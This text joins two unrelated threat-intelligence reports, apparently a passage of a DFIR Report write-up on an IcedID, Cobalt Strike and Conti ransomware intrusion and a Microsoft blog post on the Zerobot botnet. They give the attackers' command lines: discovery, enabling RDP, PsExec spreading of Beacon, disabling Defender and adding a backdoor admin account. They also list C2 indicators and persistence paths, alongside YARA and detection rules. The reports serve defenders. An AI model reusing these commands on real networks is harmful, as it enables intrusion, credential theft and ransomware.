Various attributes including the computer name and the OS version of the compromised system were sent through encoded cookie values. 
IcedID was executed via rundll32.exe and ran command and control over port 443 for the duration of the intrusion. 
rundll32.exe "C:\Users\REDACTED\AppData\Local\Temp\rate_x32.dat",update /i:"LaborBetray\license.dat" Discovery IcedID ran initial discovery after being executed on the beachhead.
Various commands were executed to gather more information about the compromised environment; including the currently logged on user, domain trusts, groups, etc . 
ipconfig /allsysteminfowhoami
/groupsnet config workstation nltest /domain_trusts nltest /domain_trusts /all_trustsnet view /all
/domainnet view /allnew group "Domain Admins" /domain 
Additional discovery commands were executed by Cobalt Strike. 
cmd.exe /C
whoami /groupscmd.exe /C query sessioncmd.exe /C
dir %HOMEDRIVE%%HOMEPATH%cmd.exe /C
nltest /domain_trustscmd.exe
/C
nltest /dclist:cmd.exe /C
net group "Enterprise admins" /domaincmd.exe /C
net group "Domain admins" /domain 
After moving laterally to a domain controller, they began looking for what networks were present in the environment using dsquery. 
cmd.exe /C dsquery subnet -limit 0 Shortly thereafter, port scanning was observed coming from a domain controller looking for common ports (such as SSH, SMB, MSSQL, WinRM and RDP, etc.)
on systems residing in the same subnet. 
Privilege Escalation 
In order to obtain SYSTEM level privileges, Cobalt Strike’s built-in named piped impersonation (GetSystem) was used: Image: “C:\Windows\System32\cmd.exe” CommandLine: “C:\Windows\system32\cmd.exe /c
echo 4d64fbbbf34 > \\. \pipe\b4312c” ParentImage: “C:\Windows\System32\runonce.exe” ParentCommandLine: “C:\Windows\system32\runonce.exe Lateral Movement The threat actor began lateral movement using remote execution of Cobalt Strike Beacon service binaries. 
Image: C:\Windows\system32\services.exe TargetObject: HKLM\System\CurrentControlSet\Services\d8d6deb\ImagePath Details: \\HOSTNAME\ADMIN$\d8d6deb.exe After this initial activity, Cobalt Strike was used to enable RDP, and allow it through the firewall, on the domain controllers. 
reg add "hklm\system\currentControlSet\Control\Terminal Server" /v
"fDenyTSConnections" /t
REG_DWORD /d
0x0 /f cmd.exe /C netsh firewall set service type = remotedesktop mode = enable cmd.exe /C netsh firewall set rule group="remote desktop" new enable=Yes cmd.exe /C netsh advfirewall set rule group="remote desktop" new enable=Yes Following this, the threat actors then copied a Cobalt Strike Beacon DLL to the ADMIN$ share; and then, distributed it throughout the environment using PsExec. cmd.exe /C
copy 192145.dll \\<INTERNAL_IP>\ADMIN$ /Y /Z 
psexec.exe -accepteula -d -s \\<INTERNAL_IP> rundll32.exe C:\windows\192145.dll,StartW From here, RDP connections were established from the beachhead host to systems throughout the environment.
The connections were proxied through the IcedID process. 
The threat actor used a redirector (38.135.122[.]194:8080) to proxy the RDP traffic being passed through the IcedID process.
The below traffic shows more details of the RDP session, including the username in the cookie. 
This proxied traffic reported back the hostname of the threat actors machine as “mikespc”.
We’re looking for you Mike! 
Defense Evasion To evade detection, the threat actors disabled Windows Defender by adding the below to an already linked GPO.
They then force updated the GPO on all clients using Cobalt Strike. 
ParentCommandLine CommandLine C:\Windows\System32\dllhost.exe C:\Windows\system32\cmd.exe /C gpupdate /force C:\Users\USER\AppData\Local\Temp\icju1.exe C:\Windows\system32\cmd.exe /C gpupdate /force C:\Windows\System32\dllhost.exe C:\Windows\system32\cmd.exe /C gpupdate /force “rundll32.exe” c:\windows\192145.dll,StartW C:\Windows\system32\cmd.exe /C gpupdate /force Registry Keys Action HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\DisableAntiSpyware DeleteValue HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Monitoring\DisableRealtimeMonitoring DeleteValue HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Monitoring\DisableBehaviorMonitoring DeleteValue HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Monitoring\DisableIntrusionPreventionSystem DeleteValue HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection DeleteKey 
In addition, other security services were stopped or uninstalled. 
NET STOP "redacted" EventID: 13 Description: RegistryEvent (Value Set) 
TargetObject: HKLM\System\CurrentControlSet\Services\<redacted>\Start Value: DWORD (0x00000004) Command and Control IcedID 68.183.20[.]194:80 vaclicinni[.]xyz 83.97.20[.]160:443 oxythuler[.]cyou expertulthima[.]club dictorecovery[.]cyou thulleultinn[.]club Key identifier: 82:92:07:
FD:86:23:FE:26:0E:4A:42:5A:F7:C7:70:2A:45:4E:01:5B Not Before: Apr 22 15:27:02 2021 GMT Not After : Apr 22 15:27:02 2022 GMT CommonName: localhost City= AU State= Some-State Org = Internet Widgits Pty Ltd ja3: a0e9f5d64349fb13191bc781f81f42e1 ja3s: ec74a5c51106f0419184d0dd08fb05bc 159.89.140[.]116:443 oxythuler[.]cyou thulleultinn[.]club Key Identifier: A4:EB:95:C2:04:91:E3:AF:67:7C:5D:B3:CB:DB:E3:38:90:5E:A7:68 Not Before: Apr 13 14:59:41 2021 GMT Not After : Apr 13 14:59:41 2022 GMT CommonName: localhost City= AU State= Some-State Org = Internet Widgits Pty Ltd ja3: a0e9f5d64349fb13191bc781f81f42e1 ja3s: ec74a5c51106f0419184d0dd08fb05bc Cobalt Strike 192.99.178[.]145:80 dimentos[.]com Config: 
Port 443:"Spawn
To x86": "%windir%\\syswow64\\runonce[.]exe", "Spawn To x64": "%windir%\\sysnative\\runonce[.]exe", "Jitter": 39, "Method 2": "POST", "Port": 443, "Beacon Type": "8 (HTTPS)", "Polling": 62719, "HTTP Method Path 2": "/btn_bg", "Method 1": "GET", "C2 Server": "dimentos[.]com,/FAQ""Spawn To x86": "%windir%\\syswow64\\runonce[.]exe", "Spawn To x64": "%windir%\\sysnative\\runonce[.]exe", "Jitter": 39, "Method 2": "POST", "Port": 443, "Beacon Type": "8 (HTTPS)", "Polling": 62719, "HTTP Method Path 2": "/btn_bg", "Method 1": "GET", "C2 Server": "dimentos[.]com,/bg"Port 80:"Spawn To x86": "%windir%\\syswow64\\runonce[.]exe", "Spawn To x64": "%windir%\\sysnative\\runonce[.]exe", "Jitter": 39, "Method 2": "POST", "Port": 80, "Beacon Type": "0 (HTTP)", "Polling": 62719, "HTTP Method Path 2": "/btn_bg", "Method 1": "GET", "C2 Server": "192[.]99[.]178[.]145,/r-arrow""Spawn To x86": "%windir%\\syswow64\\runonce[.]exe", "Spawn To x64": "%windir%\\sysnative\\runonce[.]exe", "Jitter": 39, "Method 2": "POST", "Port": 80, "Beacon Type": "0 (HTTP)", "Polling": 62719, "HTTP Method Path 2": "/btn_bg", "Method 1": "GET", "C2 Server": "192[.]99[.]178[.]145,/bg" Machine beaconing out to Cobalt Strike using the above profile Persistence An account named “nuuser” was created by one of the Cobalt Strike Beacons.
As these commands were run on a domain controller, it essentially added the account to the Built-in Administrators domain group, granting it administrative privileges in the AD domain. 
net user /add /Y 
nuuser 7HeC00l3stP@ssw0rd net localgroup administrators nuuser /add 
Credential Access LSASS was accessed by an unusual process “runonce.exe” on multiple hosts, including a domain controller. 
EventID: 10Description: Process Access SourceImage: “C:\Windows\System32\runonce.exe” TargetImage: “C:\Windows\system32\lsass.exe” SourceImage: C:\Windows\system32\runonce.exe"TargetImage: "C:\Windows\system32\lsass.exe"GrantedAccess: 0x1010CallTrace: "C:\Windows\SYSTEM32\ntdll.dll+9c584|C:\Windows\System32\KERNELBASE.dll+2730e|UNKNOWN(0000028A62BDC798)" 
The overpass-the hash technique was used to acquire a valid Kerberos ticket for the administrator user. 
Impact About two and a half hours after initial hands on keyboard activity, the Cobalt Strike Beacon processes running across the target systems injected the Conti DLL into memory.
Conti deployments using a DLL seem to have first started showing up in December 2020. 
First time that I see #Conti ransomware spread as a DLL :Hash : 5c278c04bb19196dc8559d45b9728b3ba0c1bc5cdd20a766f56248e561c6f5a6 Pdb : A:sourceconti_v3x64Releasecryptor_dll.pdb (cc @GrujaRS @malwrhunterteam )
pic.twitter.com/gH3uCpVMpB— (づ｡◕‿‿◕｡)づ (@Glacius_)
December 8, 2020 Some traces of this particular DLL were found in the memory dump taken from one of the compromised systems. 
We were unable to reconstruct the DLL from memory but Maxime Thiebaut (@0xThiebaut) from NVISO helped us out.
The Yara rule, located in the detections section below was made possible due to him reconstructing the DLL.
Thanks Maxime! 
Conti scans the network for 445/SMB, looking for machines to encrypt. 
Ransom note Which leads you here. 
The threat actors asked for 150k and could have been talked down at least ~20%. 
Multiple machines within the environment were not usable after being ransomed including a domain controller.
The machines were left like this and you were not able to do anything but press control+alt+delete.
Paying the ransom will not help you here. 
Pivots While researching the infrastructure related to this campaign, we found the threat actor revealed further infrastructure.
The domain associated with the Cobalt Strike C2 (dimentos[.]com) has an unredacted Whois record that reveals several other domains also registered by the address pokix19891[@]kindbest[.]com.
You’ll notice the fake address and fake phone number as well. 
All the domains were registered on 2021-03-30, and according to public data available in VirusTotal, three of them have been associated with Cobalt Strike infrastructure so far; the domain seen in this intrusion, powelin[.]com and awesents[.]com. 
The two other domains (jocinet[.]com, ilimennt[.]com) have subdomains that look like name servers (ns1 and ns2), which were pointed to two of the Cobalt Strike hosting IP’s.
All of this infrastructure was hosted on the VPS provider OVH. IOCs Files b52c0640957e5032b5160578f8cb99f9b066fde4f9431ee6869b2eea67338f28.dll.exe b52c0640957e5032b5160578f8cb99f9b066fde4f9431ee6869b2eea67338f28 icju1.exe e54f38d06a4f11e1b92bb7454e70c949d3e1a4db83894db1ab76e9d64146ee06 rate_x32.dat eb79168391e64160883b1b3839ed4045b4fd40da14d6eec5a93cfa9365503586192145.dll f29bc338e63a62c24c301c04961084013816733dad446a29c20d4413c5c818af9 Network IcedID vaclicinni[.]xyz thulleultinn[.]club oxythuler[.]cyou dictorecovery[.]cyou expertulthima[.]club 68.183.20[.]194:80 159.89.140[.]116:443 83.97.20[.]160:443 Cobalt Strikedimentos[.]com 192.99.178[.]145:80 Proxy38.135.122[.]194:8080 Detections Surricata ET MALWARE Win32/IcedID Requesting Encoded Binary M4 ET MALWARE W32/Photoloader.
Downloader Request Cookie ET POLICY PE EXE or DLL Windows file download HTTP ET INFO Executable Retrieved With Minimal HTTP Headers – Potential Second Stage Download ET INFO Packed Executable Download ET POLICY OpenSSL Demo CA – Internet Widgits Pty ATTACK
[PTsecurity] Overpass the hash.
Encryption downgrade activity to ARCFOUR-HMAC-MD5 ET SCAN Behavioral Unusual Port 135 traffic Potential Scan or Infection ET SCAN Behavioral Unusual Port 445 traffic Potential Scan or Infection ET SCAN Behavioral Unusual Port 1434 traffic Potential Scan or Infection ET SCAN Behavioral Unusual Port 1435 traffic Potential Scan or Infection Sigma https://github.com/SigmaHQ/sigma/blob/master/rules/windows/builtin/win_meterpreter_or_cobaltstrike_getsystem_service_installation.yml https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/win_susp_commands_recon_activity.yml https://github.com/SigmaHQ/sigma/blob/master/rules/windows/other/win_defender_disabled.yml https://github.com/SigmaHQ/sigma/blob/master/rules/windows/other/win_tool_psexec.yml https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_access/sysmon_in_memory_assembly_execution.yml https://github.com/SigmaHQ/sigma/blob/master/rules/windows/network_connection/sysmon_rundll32_net_connections.yml https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/win_net_user_add.yml https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/win_psexesvc_start.yml https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/win_susp_psexec_eula.yml Sigma Rule Converter for SIEMs and EDRs: https://uncoder.io/ YARA /*YARA Rule SetAuthor:
The DFIR ReportDate: 2021-05-09Identifier: 3584Reference: https://thedfirreport.com*//*
Rule Set -----------------------------------------------------------------
*/import "pe"rule icedid_rate_x32 {meta:description = "files - file rate_x32.dat"author = "The DFIR Report"reference = "https://thedfirreport.com"date = "2021-05-09"hash1 = "eb79168391e64160883b1b3839ed4045b4fd40da14d6eec5a93cfa9365503586"strings:$s1 = "UAWAVAUATVWSH" fullword ascii$s2 = "UAWAVVWSPH" fullword ascii$s3 = "AWAVAUATVWUSH" fullword ascii$s4 = "update" fullword ascii /*
Goodware String - occured 207 times */$s5 = "?klopW@@YAHXZ" fullword ascii$s6 = "?jutre@@YAHXZ" fullword ascii$s7 = "PluginInit" fullword ascii$s8 = "[]_^A\\A]A^A_"
fullword ascii$s9 = "e8[_^A\\A]A^A_]" fullword ascii$s10 = "[_^A\\A]A^A_]" fullword ascii$s11 = "Kts=R,4iu" fullword ascii$s12 = "mqr55c" fullword ascii$s13 = "R,4i=Bj" fullword ascii$s14 = "Ktw=R,4iu" fullword ascii$s15 = "Ktu=R,4iu" fullword ascii$s16 = "Kt{=R,4iu" fullword ascii$s17 = "KVL.Mp" fullword ascii$s18 = "Kt|=R,4iu" fullword ascii$s19 = "=8c[Vt8=" fullword ascii$s20 = "Ktx=R,4iu" fullword asciicondition:uint16(0) == 0x5a4d and filesize < 700KB and( pe.imphash() == "15787e97e92f1f138de37f6f972eb43c" and ( pe.exports("?jutre@@YAHXZ") and pe.exports("?klopW@@YAHXZ") and pe.exports("PluginInit") and pe.exports("update") ) or 8 of them )}rule conti_cobaltstrike_192145 {meta:description = "files - file 192145.dll"author = "The DFIR Report"reference = "https://thedfirreport.com"date = "2021-05-09"hash1 = "29bc338e63a62c24c301c04961084013816733dad446a29c20d4413c5c818af9"strings:$x1 = "cmd.exe /c
echo
NGAtoDgLpvgJwPLEPFdj>\"%s\"&exit" fullword ascii$s2 = "veniamatquiest90.dll" fullword ascii$s3 = "Quaerat magni assumenda nihil architecto labore ullam autem unde temporibus mollitia illum" fullword ascii$s4 = "Quaerat tempora culpa provident" fullword ascii$s5 = "Velit consequuntur quisquam tempora error" fullword ascii$s6 = "Quo omnis repellat ut expedita temporibus eius fuga error" fullword ascii$s7 = "Dolores ullam tempora error distinctio ut natus facere quibusdam" fullword ascii$s8 = "Corporis minima omnis qui est temporibus sint quo error magnam" fullword ascii$s9 = "Officia sit maiores deserunt nobis tempora deleniti aut et quidem fugit" fullword ascii$s10 = "Rerum tenetur sapiente est tempora qui deserunt" fullword ascii$s11 = "Sed nulla quaerat porro error excepturi" fullword ascii$s12 = "Aut tempore quo cumque dicta ut quia in" fullword ascii$s13 = "Doloribus commodi repudiandae voluptates consequuntur neque tempora ut neque nemo ad ut" fullword ascii$s14 = "Tempore possimus aperiam nam mollitia illum hic at ut doloremque" fullword ascii$s15 = "Dolorum eum ipsum tempora non et" fullword ascii$s16 = "Quas alias illum laborum tempora sit est rerum temporibus dicta et" fullword ascii$s17 = "Et quia aut temporibus enim repellat dolores totam recusandae repudiandae" fullword ascii$s18 = "Sed velit ipsa et dolor tempore sunt nostrum" fullword ascii$s19 = "Veniam voluptatem aliquam et eaque tempore tenetur possimus" fullword ascii$s20 = "Possimus suscipit placeat dolor quia tempora voluptas qui fugiat et accusantium" fullword asciicondition:uint16(0) == 0x5a4d and filesize < 2000KB and( pe.imphash() == "5cf3cdfe8585c01d2673249153057181" and pe.exports("StartW") or ( 1 of ($x*) or 4 of them ) )}rule conti_cobaltstrike_icju1
{meta:description = "files - file icju1.exe"author = "The DFIR Report"reference = "https://thedfirreport.com"date = "2021-05-09"hash1 = "e54f38d06a4f11e1b92bb7454e70c949d3e1a4db83894db1ab76e9d64146ee06"strings:$x1 = "cmd.exe /c
echo NGAtoDgLpvgJwPLEPFdj>\"%s\"&exit" fullword ascii$s2 = "veniamatquiest90.dll" fullword ascii$s3 = "Quaerat magni assumenda nihil architecto labore ullam autem unde temporibus mollitia illum" fullword ascii$s4 = "Quaerat tempora culpa provident" fullword ascii$s5 = "Velit consequuntur quisquam tempora error" fullword ascii$s6 = "Quo omnis repellat ut expedita temporibus eius fuga error" fullword ascii$s7 = "Dolores ullam tempora error distinctio ut natus facere quibusdam" fullword ascii$s8 = "Corporis minima omnis qui est temporibus sint quo error magnam" fullword ascii$s9 = "Officia sit maiores deserunt nobis tempora deleniti aut et quidem fugit" fullword ascii$s10 = "Rerum tenetur sapiente est tempora qui deserunt" fullword ascii$s11 = "Sed nulla quaerat porro error excepturi" fullword ascii$s12 = "Aut tempore quo cumque dicta ut quia in" fullword ascii$s13 = "Doloribus commodi repudiandae voluptates consequuntur neque tempora ut neque nemo ad ut" fullword ascii$s14 = "Tempore possimus aperiam nam mollitia illum hic at ut doloremque" fullword ascii$s15 = "Dolorum eum ipsum tempora non et" fullword ascii$s16 = "Quas alias illum laborum tempora sit est rerum temporibus dicta et" fullword ascii$s17 = "Et quia aut temporibus enim repellat dolores totam recusandae repudiandae" fullword ascii$s18 = "Sed velit ipsa et dolor tempore sunt nostrum" fullword ascii$s19 = "Veniam voluptatem aliquam et eaque tempore tenetur possimus" fullword ascii$s20 = "Possimus suscipit placeat dolor quia tempora voluptas qui fugiat et accusantium" fullword asciicondition:uint16(0) == 0x5a4d and filesize < 2000KB and( pe.imphash() == "a6d9b7f182ef1cfe180f692d89ecc759" or ( 1 of ($x*) or 4 of them ) )}rule conti_v3 {meta:description = "conti_yara - file conti_v3.dll" author = "pigerlin" reference = "https://thedfirreport.com" date = "2021-05-09" hash1 = "8391dc3e087a5cecba74a638d50b771915831340ae3e027f0bb8217ad7ba4682"strings: $s1 = "AppPolicyGetProcessTerminationMethod" fullword ascii $s2 = "conti_v3.dll" fullword ascii $s3 = " <requestedExecutionLevel level='asInvoker' uiAccess='false' />" fullword ascii $s4 = " Type Descriptor'" fullword ascii $s5 = "operator co_await" fullword ascii $s6 = " <trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\">" fullword ascii $s7 = "api-ms-win-appmodel-runtime-l1-1-2" fullword wide $s8 = " Base Class Descriptor at (" fullword ascii $s9 = " Class Hierarchy Descriptor'" fullword ascii $s10 = " Complete Object Locator'" fullword ascii $s11 = " delete[]" fullword ascii $s12 = " </trustInfo>" fullword ascii $s13 = "__swift_1" fullword ascii $s15 = "__swift_2" fullword ascii $s19 = " delete" fullword asciicondition:uint16(0) == 0x5a4d and filesize < 700KB andall of them}rule conti_cobaltstrike_192145_icju1_0 {meta:description = "files - from files 192145.dll, icju1.exe"author = "The DFIR Report"reference = "https://thedfirreport.com"date = "2021-05-09"hash1 = "29bc338e63a62c24c301c04961084013816733dad446a29c20d4413c5c818af9"hash2 = "e54f38d06a4f11e1b92bb7454e70c949d3e1a4db83894db1ab76e9d64146ee06"strings:$x1 = "cmd.exe /c
echo NGAtoDgLpvgJwPLEPFdj>\"%s\"&exit" fullword ascii$s2 = "veniamatquiest90.dll" fullword ascii$s3 = "Quaerat magni assumenda nihil architecto labore ullam autem unde temporibus mollitia illum" fullword ascii$s4 = "Quaerat tempora culpa provident" fullword ascii$s5 = "Dolores ullam tempora error distinctio
ut natus facere quibusdam" fullword ascii$s6 = "Velit consequuntur quisquam tempora error" fullword ascii$s7 = "Corporis minima omnis qui est temporibus sint quo error magnam" fullword ascii$s8 = "Quo omnis repellat ut expedita temporibus eius fuga error" fullword ascii$s9 = "Officia sit maiores deserunt nobis tempora deleniti aut et quidem fugit" fullword ascii$s10 = "Rerum tenetur sapiente est tempora qui deserunt" fullword ascii$s11 = "Sed nulla quaerat porro error excepturi" fullword ascii$s12 = "Aut tempore quo cumque dicta ut quia in" fullword ascii$s13 = "Doloribus commodi repudiandae voluptates consequuntur neque tempora ut neque nemo ad ut" fullword ascii$s14 = "Tempore possimus aperiam nam mollitia illum hic at ut doloremque" fullword ascii$s15 = "Et quia aut temporibus enim repellat dolores totam recusandae repudiandae" fullword ascii$s16 = "Dolorum eum ipsum tempora non et" fullword ascii$s17 = "Quas alias illum laborum tempora sit est rerum temporibus dicta et" fullword ascii$s18 = "Sed velit ipsa et dolor tempore sunt nostrum" fullword ascii$s19 = "Veniam voluptatem aliquam et eaque tempore tenetur possimus" fullword ascii$s20 = "Possimus suscipit placeat dolor quia tempora voluptas qui fugiat et accusantium" fullword asciicondition:( uint16(0) == 0x5a4d and filesize < 2000KB and ( 1 of ($x*) and 4 of them ))
or ( all of them )} MITRE: Command and Scripting Interpreter – T1059External Proxy – T1090.002Remote Desktop Protocol – T1021.001OS Credential Dumping –
T1003Pass the Hash – T1550.002Service Execution – T1569.002SMB/Windows Admin Shares – T1021.002Data Encrypted for Impact – T1486System Owner/User Discovery – T1033Permission Groups Discovery – T1069Application Layer Protocol – T1071Process Injection – T1055Group Policy Modification –
T1484Access Token Manipulation – T1134Create Account – T1136Remote System Discovery – T1018Network Service Scanning – T1046Domain Account – T1087.002Impair Defenses – T1562 Internal case: 3584 The post Conti Ransomware appeared first on The DFIR Report. 
title: Microsoft research uncovers new Zerobot capabilities - Microsoft Security Blog url: http://www.microsoft.com/en-us/security/blog/2022/12/21/microsoft-research-uncovers-new-zerobot-capabilities/ Botnet malware operations are a constantly evolving threat to devices and networks.
Threat actors target Internet of Things (IoT) devices for recruitment into malicious operations as IoT devices’ configurations often leave them exposed, and the number of internet-connected devices continue to grow.
Recent trends have shown that operators are redeploying malware for a variety of distributions and objectives, modifying existing botnets to scale operations and add as many devices as possible to their infrastructure. 
Zerobot, a Go-based botnet that spreads primarily through IoT and web application vulnerabilities, is an example of an evolving threat, with operators continuously adding new exploits and capabilities to the malware.
The Microsoft Defender for IoT research team has been monitoring Zerobot (also called ZeroStresser by its operators) for months.
Zerobot is offered as part of a malware as a service scheme and has been updated several times since Microsoft started to track it.
One domain with links to Zerobot was among several domains associated with DDoS-for-hire services seized by the FBI in December 2022. 
Microsoft has previously reported on the evolving threat ecosystem.
The shift toward malware as a service in the cyber economy has industrialized attacks and has made it easier for attackers to purchase and use malware, establish and maintain access to compromised networks, and utilize ready-made tools to perform their attacks.
We have tracked advertisements for the Zerobot botnet on various social media networks in addition to other announcements regarding the sale and maintenance of the malware, as well as new capabilities in development. 
In this blog post, we present information about the latest version of the malware, Zerobot 1.1, including newly identified capabilities and further context to Fortinet’s recent analysis on the threat.
Zerobot 1.1 increases its capabilities with the inclusion of new attack methods and new exploits for supported architectures, expanding the malware’s reach to different types of devices.
In addition to these findings, we’re sharing new indicators of compromise (IOCs) and recommendations to help defenders protect devices and networks against this threat. 
What is Zerobot? Zerobot affects a variety of devices that include firewall devices, routers, and cameras, adding compromised devices to a distributed denial of service (DDoS) botnet.
Using several modules, the malware can infect vulnerable devices built on diverse architectures and operating systems, find additional devices to infect, achieve persistence, and attack a range of protocols.
Microsoft tracks this activity as DEV-1061. 
The most recent distribution of Zerobot includes additional capabilities, such as exploiting vulnerabilities in Apache and Apache Spark (CVE-2021-42013 and CVE-2022-33891 respectively), and new DDoS attack capabilities. 
Microsoft uses DEV-#### designations as a temporary name given to an unknown, emerging, or developing cluster of threat activity, allowing Microsoft to track it as a unique set of information until we can reach high confidence about the origin or identity of the actor behind the activity.
Once it meets defined criteria, a DEV group is converted to a named actor. 
How Zerobot gains and maintains device access IoT devices are often internet-exposed, leaving unpatched and improperly secured devices vulnerable to exploitation by threat actors.
Zerobot is capable of propagating through brute force attacks on vulnerable devices with insecure configurations that use default or weak credentials.
The malware may attempt to gain device access by using a combination of eight common usernames and 130 passwords for IoT devices over SSH and telnet on ports 23 and 2323 to spread to devices.
Microsoft researchers identified numerous SSH and telnet connection attempts on default ports 22 and 23, as well as attempts to open ports and connect to them by port-knocking on ports 80, 8080, 8888, and 2323. 
In addition to brute force attempts on devices, Zerobot exploits dozens of vulnerabilities, which malware operators add on a rolling basis to gain access and inject malicious payloads.
Zerobot 1.1 includes several new vulnerabilities, such as: VulnerabilityAffected softwareCVE-2017-17105Zivif PR115-204-P-RSCVE-2019-10655GrandstreamCVE-2020-25223WebAdmin of Sophos SG UTMCVE-2021-42013ApacheCVE-2022-31137Roxy-WICVE-2022-33891Apache SparkZSL-2022-5717MiniDVBLinuxSince the release of Zerobot 1.1, the malware operators have removed CVE-2018-12613, a phpMyAdmin vulnerability that could allow threat actors to view or execute files.
Microsoft researchers have also identified that previous reports have used the vulnerability ID “ZERO-32906” for CVE-2018-20057, “GPON” for CVE-2018-10561, and “DLINK” for CVE-2016-20017; and that CVE-2020-7209 was mislabeled as CVE-2017-17106 and CVE-2022-42013 was mislabeled as CVE-2021-42013. 
Microsoft researchers have also found new evidence that Zerobot propagates by compromising devices with known vulnerabilities that are not included in the malware binary, such as CVE-2022-30023, a command injection vulnerability in Tenda GPON AC1200 routers. 
Upon gaining device access, Zerobot injects a malicious payload, which may be a generic script called zero.sh that downloads and attempts to execute Zerobot, or a script that downloads the Zerobot binary of a specific architecture.
The bash script that attempts to download different Zerobot binaries tries to identify the architecture by brute-force, attempting to download and execute binaries of various architectures until it succeeds, as IoT devices are based on many computer processing units (CPUs).
Microsoft has observed scripts targeting various architectures including ARM64, MIPS, and x86_64. 
Depending on the operating system of the device, the malware has different persistence mechanisms.
Persistence tactics are used by malware operators to obtain and maintain access to devices.
While Zerobot is unable to spread to Windows machines, we have found several samples that can run on Windows.
On Windows machines, the malware copies itself to the Startup folder with the file name FireWall.exe
(older versions use my.exe).
Microsoft Defender for Endpoint detects this malware and related malicious activity on both Windows and Linux devices.
See detection details below. 
To achieve persistence on Linux-based devices, Zerobot uses a combination of desktop entry, daemon, and service methods: Desktop entry: Zerobot copies itself to $HOME/.config/ssh.service/sshf then writes a desktop entry file called sshf.desktop to the same directory.
Older Linux versions use $HOME/.config/autostart instead of $HOME/.config/ssh.service. 
Daemon: Copies itself to /usr/bin/sshf and writes a configuration at /etc/init/sshf.conf. 
Service: Copies itself to /etc/sshf and writes a service configuration at /lib/system/system/sshf.service, then enables the service (to make sure it starts at boot) with two commands: systemctl enable sshf service enable sshf All persistence mechanisms on older Linux versions use my.bin and my.bin.desktop instead of sshf and sshf.desktop. 
New attack capabilities 
In addition to the functions and attacks included in previous versions of the malware, Zerobot 1.1 has additional DDoS attack capabilities.
These functions allow threat actors to target resources and make them inaccessible.
Successful DDoS attacks may be used by threat actors to extort ransom payments, distract from other malicious activities, or disrupt operations.
In almost every attack, the destination port is customizable, and threat actors who purchase the malware can modify the attack according to their target. 
The following are the previously known Zerobot capabilities: Attack methodDescriptionUDP_LEGITSends UDP packets without data.
MC_PINGMeant for DDoS on Minecraft servers.
Sends a handshake and status request.
TCP_HANDSHAKEFloods with TCP handshakes.
TCP_SOCKETContinuously sends random payloads on an open TCP socket.
Payload length is customizable.
TLS_SOCKETContinuously sends random payloads on an open TLS socket.
HTTP_HANDLESends HTTP GET requests using a Golang standard library.
HTTP_RAWFormats and sends HTTP GET requests.
HTTP_BYPASSSends HTTP GET requests with spoofed headers.
HTTP_NULLHTTP
headers are each one random byte (not necessarily ascii).Previously undisclosed and new capabilities are the following: Attack methodDescriptionUDP_RAWSends UDP packets where the payload is customizable.
ICMP_FLOODSupposed to be an ICMP flood, but the packet is built incorrectly.
TCP_CUSTOMSends TCP packets where the payload and flags are fully customizable.
TCP_SYNSends SYN packets.
TCP_ACKSends ACK packets.
TCP_SYNACKSends SYN-ACK packets.
TCP_XMASChristmas tree attack (all TCP flags are set).
The reset cause field is “xmas”.
How Zerobot spreads After persistence is achieved, Zerobot scans for other internet-exposed devices to infect.
The malware randomly generates a number between 0 and 255 and scans all IPs starting with this value.
Using a function called new_botnet_selfRepo_isHoneypot, the malware tries to identify honeypot IP addresses, which are used by network decoys to attract cyberattacks and collect information on threats and attempts to access resources.
This function includes 61 IP subnets, preventing scanning of these IPs. 
Microsoft researchers also identified a sample that can run on Windows based on a cross-platform (Linux, Windows, macOS) open-source remote administration tool (RAT) with various features such as managing processes, file operations, screenshotting, and running commands.
This tool was found by investigating the command-and-control (C2) IPs used by the malware.
The script, which is used to download this RAT, is called impst.sh: Figure 1.
The impst.sh script used to download the remote administration toolDefending devices and networks against Zerobot The continuous evolution and rapid addition of new capabilities in the latest Zerobot version underscores the urgency of implementing comprehensive security measures.
Microsoft recommends the following steps to protect devices and networks against the threat of Zerobot: Use security solutions with cross-domain visibility and detection capabilities like Microsoft 365 Defender, which provides integrated defense across endpoints, identities, email, applications, and data.
Microsoft Defender Antivirus and Microsoft Defender for Endpoint detect Zerobot malware variants and malicious behavior related to this threat. 
Adopt a comprehensive IoT security solution such as Microsoft Defender for IoT to allow visibility and monitoring of all IoT and OT devices, threat detection and response, and integration with SIEM/SOAR and XDR platforms such as Microsoft Sentinel and Microsoft 365 Defender.
Ensure secure configurations for devices: Change the default password to a strong one, and block SSH from external access.
Maintain device health with updates: Make sure devices are up to date with the latest firmware and patches.
Use least privileges access: Use a secure virtual private network (VPN) service for remote access and restrict remote access to the device. 
Harden endpoints with a comprehensive Windows security solution:Manage the apps your employees can use through Windows Defender Application Control and for unmanaged solutions, enabling Smart App Control.
Perform timely cleanup of all unused and stale executables sitting on yours or your organizations’ devices. 
Detections Microsoft Defender for IoT Microsoft Defender for IoT uses detection rules and signatures to identify malicious behavior.
Microsoft Defender for IoT has alerts for the following vulnerabilities and exploits which may be tied to Zerobot activity: CVE-2014-8361 CVE-2016-20017 CVE-2017-17105 CVE-2017-17215 CVE-2018-10561 CVE-2018-20057 CVE-2019-10655 CVE-2020-7209 CVE-2020-10987 CVE-2020-25506 CVE-2021-35395 CVE-2021-36260 CVE-2021-42013 CVE-2021-46422 CVE-2022-22965 CVE-2022-25075 CVE-2022-26186 CVE-2022-26210 CVE-2022-30023 CVE-2022-30525 CVE-2022-31137 CVE-2022-33891 CVE-2022-34538 CVE-2022-37061 ZERO-36290 ZSL-2022-5717 Microsoft Defender Antivirus Microsoft Defender Antivirus detects the malicious files under the following platforms and threat names: 
Zerobot (Win32/64 and Linux) SparkRat (Win32/64 and Linux) 
